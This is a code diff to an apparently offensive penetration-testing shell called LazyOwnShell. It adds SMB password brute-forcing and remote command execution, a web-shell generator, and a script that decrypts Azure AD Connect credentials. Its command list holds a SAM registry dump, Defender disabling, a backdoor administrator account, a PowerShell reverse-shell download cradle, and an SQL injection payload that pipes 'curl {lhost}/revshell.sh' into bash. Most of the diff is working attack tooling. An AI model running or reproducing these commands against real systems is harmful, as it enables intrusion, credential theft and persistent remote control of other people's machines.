@@ -81,10 +81,12 @@ class LazyOwnShell(Cmd):
         "creds": "sh cat sessions/credentials*",
         "discovery": "run lazynmapdiscovery",
         "duckdns": "sh bash modules/duckdns.sh",
+        "edit":"sh nano payload.json",
         "ftpsniff": "run lazyftpsniff",
         "gpt": "run lazygptcli",
         "hash": "sh cat sessions/hash*",
         "hosts": "sh sudo nano /etc/hosts",
+        "info":"echo \"<?php phpinfo(); ?>\" > sessions/info.php",
         "ls": "list",
         "nmap": "run lazynmap",
         "now": "clock",
@@ -2348,6 +2350,7 @@ class LazyOwnShell(Cmd):
         :returns: None"""
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
+        domain = self.params["domain"]
         path = os.getcwd()
         path_cred = f"{path}/sessions/credentials.txt"
         if not check_rhost(rhost):
@@ -2370,36 +2373,59 @@ class LazyOwnShell(Cmd):
             print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
             return
         else:
-
-            if line:
-                with open(path_cred, "r") as file:
-                    for file_line in file:
-                        params = file_line.split(":")
-                        user = params[0]
-                        passwd = params[1].replace("\n", "")
-                        command = f"smbmap -u {user} -p {passwd} -H {rhost} -R {line}"
-                        copy2clip(passwd)
-                        print_msg(command)
-                        os.system(command)
-                        print_msg(
-                            f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
-                        )
-                        print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
-                        return
+            path_cred = get_credentials(True)
+            if_execute = input(f"    {GREEN}[?] Do you wanna try exec commands (y/n)") or "n"
+            if if_execute == "y":
+                execute = " -x "
+                command_try = input(f"    {GREEN}[!] Enter the command to try (default: whoami): ") or "whoami"
+                execute += command_try
             else:
-                with open(path_cred, "r") as file:
-                    for file_line in file:
-                        params = file_line.split(":")
-                        user = params[0]
-                        passwd = params[1].replace("\n", "")
-                        command = f"smbmap -u {user} -p {passwd} -H {rhost}"
-                        copy2clip(passwd)
-                        print_msg(command)
-                        os.system(command)
-                        print_msg(
-                            f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
-                        )
-                        print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+           
+                if_search =  input(f"    {GREEN}[?] Do you wanna try search files (y/n)") or "n"
+                if if_search == "y":
+                    execute = " -A "
+
+                    command_try = input(f"    {GREEN}[!] Enter the share for potentially interesting files [default: (xlsx|docx|txt|xml)]: ") or "(xlsx|docx|txt|xml)"
+                    execute += f"'{command_try}' -R"
+                else:
+                    execute = ""
+
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    user = params[0]
+                    passwd = params[1].replace("\n", "")
+
+            if len(execute) == 0:
+                if line:
+                    command = f"smbmap -u {user} -p {passwd} -H {rhost} -R {line}"
+                    copy2clip(passwd)
+                    print_msg(command)
+                    os.system(command)
+                    print_msg(
+                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
+                    )
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    return
+                else:
+                    command = f"smbmap -u {user} -p {passwd} -H {rhost}"
+                    copy2clip(passwd)
+                    print_msg(command)
+                    os.system(command)
+                    print_msg(
+                        f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
+                    )
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    return
+            else:
+                command = f"cd sessions && smbmap -u {user} -p {passwd} -d {domain} -H {rhost} {execute}"
+                print_msg(command)
+                os.system(command)
+                print_msg(
+                    f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
+                )
+                print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')                
+                return
         return
 
     def do_getnpusers(self, line):
@@ -3240,6 +3266,7 @@ class LazyOwnShell(Cmd):
         """
         path = os.getcwd()
         rhost = self.params["rhost"]
+        domain = self.params["domain"]
         if check_rhost(rhost):
             if line:
                 if line.startswith("rid"):
@@ -3290,7 +3317,21 @@ class LazyOwnShell(Cmd):
                     os.system(f"crackmapexec smb {rhost} -u {username} -p '{password}'")
                     print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p '{password}'")
                     return
-
+                elif line.startswith("brute"):
+                    print_msg("Enter the users diccionary:")
+                    path_cred = get_users_dic()
+                    print_msg("Enter the password diccionary:")
+                    pass_cred = get_users_dic()
+                    if not os.path.exists(path_cred):
+                        print_error(f"Error with the file: {pass_cred}")
+                        return
+                    else:
+                        print_msg("Brute-forcing SMB... this may take several minutes...")
+                        command = f"crackmapexec smb {rhost} -d {domain} -u {path_cred} -p {pass_cred} --continue-on-success"
+                        print_msg(f"Try... {command}")
+                        os.system(command)
+                        print_warn(f"Done... {command}")
+                        return
 
             print_msg(f"Try... crackmapexec smb {rhost}")
             os.system(f"crackmapexec smb {rhost}")
@@ -5155,6 +5196,7 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
         url = self.params["url"]
         domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
         asub = domain.split(".")
         name = asub[0]
         ext = asub[1]
@@ -5162,10 +5204,9 @@ class LazyOwnShell(Cmd):
             return
 
         commands_list = [
-            ("List dir", "ls -lha"),
+            
             ("list file attributes on a Linux second extended file system", "lsattr -va"),
             ("show opened ports", "netstat -an | grep -i listen"),
-            ("process status", "ps aux"),
             ("Find", "find / -type f \( -iname '*cred*' -o -iname '*pass*' -o -iname 'credentials' -o -iname 'password' \) -print -o -exec grep -i -l -e 'cred' -e 'pass' -e 'credentials' -e 'password' {} + 2>/dev/null"),
             ("find all suid files", "find / -type f -perm -04000 -ls"),
             ("find suid files in current dir", "find . -type f -perm -04000 -ls"),
@@ -5248,7 +5289,7 @@ class LazyOwnShell(Cmd):
             ("WIN RemoteSigned", "Set-ExecutionPolicy RemoteSigned -Scope Process"),
             ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
             ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
-            ("PYPYKATZ", "pypykatz registry --sam sam system"),
+            ("WIN PYPYKATZ", "pypykatz registry --sam sam system"),
             ("WIN WEB Inyection", "abc.txt | powershell -enc "),
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
             ("WIN ReverShell winbase64encode", f'echo -n "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
@@ -5257,9 +5298,13 @@ class LazyOwnShell(Cmd):
             ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
             ("WIN enum WMI access",'netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes'),
             ("WIN Identify Exclusions",'& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\\folder_to_check\|*"'),
+            ("WIN ADSync", "Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync"),
+            ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
+            ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
             ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b ")
+
 
         ]
         
@@ -9774,11 +9819,12 @@ class LazyOwnShell(Cmd):
         if not line:
             print_error("You must pass the password of weevly shell as an argument. example: weevelygen s3cr3t")
             return
-       
-        command = f"cd sessions && weevely generate {line} weevely.php"
-        print_msg(f"weevely generate {line}")
+        
+        name = input("    [!] Enter the file name: (default: weevely.php)") or 'weevely.php'
+        command = f"cd sessions && weevely generate {line} {name}"
+        print_msg(f"weevely generate {line} {name}")
         os.system(command)
-        print_msg("Now you can run: weevely http//:victim.local/weevely.php s3cr3t")
+        print_msg(f"Now you can run: weevely http//:victim.local/{name} {line}")
         return
         
     def do_weevely(self, line):
@@ -10324,9 +10370,13 @@ class LazyOwnShell(Cmd):
             credentials = get_credentials()
             if not credentials:
                 return  
-
+            ask = input("    [?] Do you pass a powershell ? (y/n): ") or 'n'
+            if ask == "y":
+                ps1 = "-s . "
+            else:
+                ps1 = ""
             for user, passwd in credentials:
-                command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
+                command = f"cd sessions && evil-winrm -i {rhost} -u {user} -p '{passwd}' {ps1}"
                 print_msg(command)
                 os.system(command)
             return
@@ -14621,7 +14671,6 @@ class LazyOwnShell(Cmd):
         Example:
             penelope 5555 -i eth0
         """
-        import os
 
         path = os.getcwd()
         exploit_dir = os.path.join(path, "external/.exploit")
@@ -14788,6 +14837,72 @@ class LazyOwnShell(Cmd):
         command = f"tmux split-window -h -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
         print_msg(command)
         subprocess.run(command, shell=True)
+
+    def do_adgetpass(self, line):
+        """
+        Command adgetpass: Generates a PowerShell script to extract credentials from Azure AD Connect Sync.
+
+        This function generates a PowerShell script based on user inputs, including the SQL server,
+        database, and custom keyset values. The script retrieves encryption keys, decrypts credentials,
+        and outputs the domain, username, and password from the AD Sync configuration.
+
+        Args:
+            line (str): Optional argument to specify the server name, database name, and other options
+                        in the following format: "server_name database_name keyset_id instance_id entropy".
+
+        Returns:
+            None
+
+        Example:
+            adgetpass MONTEVERDE ADSync 1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
+        """
+        
+        args = line.split() if line else []
+        subdomain = self.params["subdomain"]
+        server = args[0] if len(args) > 0 else input(f"    [!] Enter the SQL Server (default '{subdomain}'): ").strip() or subdomain
+        database = args[1] if len(args) > 1 else input("    [!] Enter the Database Name (default 'ADSync'): ").strip() or "ADSync"
+        key_id = args[2] if len(args) > 2 else input("    [!] Enter Keyset ID (default '1'): ").strip() or "1"
+        instance_id = args[3] if len(args) > 3 else input("    [!] Enter Instance ID (GUID): ").strip()
+        entropy = args[4] if len(args) > 4 else input("    [!] Enter Entropy (GUID): ").strip()
+        dll_path = input("    [!] Enter the path to 'mcrypt.dll' (default 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'): ").strip() or 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'
+        config1 = input("    [!] enter parameter nº 1 (default: forest-login-domain)") or "forest-login-domain"
+        config2 = input("    [!] enter parameter nº 2 (default: forest-login-user)") or "forest-login-user"
+        ps_script = '''Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+        $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server={server};Database={database};Trusted_Connection=true"
+        $client.Open()
+        $cmd = $client.CreateCommand()
+        $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+        $reader = $cmd.ExecuteReader()
+        $reader.Read() | Out-Null
+        $config = $reader.GetString(0)
+        $crypted = $reader.GetString(1)
+        $reader.Close()
+
+        add-type -path '{dll_path}'
+        $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+        $km.LoadKeySet([GUID]"{entropy}", [GUID]"{instance_id}", {key_id})
+        $key = $null
+        $km.GetActiveCredentialKey([ref]$key)
+        $key2 = $null
+        $km.GetKey(1, [ref]$key2)
+        $decrypted = $null
+        $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+        $domain = (select-xml -Content $config -XPath "//parameter[@name='{config1}']").Node.InnerText
+        $username = (select-xml -Content $config -XPath "//parameter[@name='{config2}']").Node.InnerText
+        $password = (select-xml -Content $decrypted -XPath "//attribute").Node.InnerText
+
+        Write-Host ("Domain: " + $domain)
+        Write-Host ("Username: " + $username)
+        Write-Host ("Password: " + $password)
+        '''.replace("{server}", server).replace("{database}", database).replace("{dll_path}", dll_path).replace("{entropy}", entropy).replace("{instance_id}", instance_id).replace("{key_id}", key_id).replace("        ","").replace("{config1}", config1).replace("{config2}", config2)
+
+        with open('sessions/adconnect.ps1', 'w') as file:
+            file.write(ps_script)
+
+        print_msg("PowerShell script 'sessions/adconnect.ps1' has been created.")
+        return
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
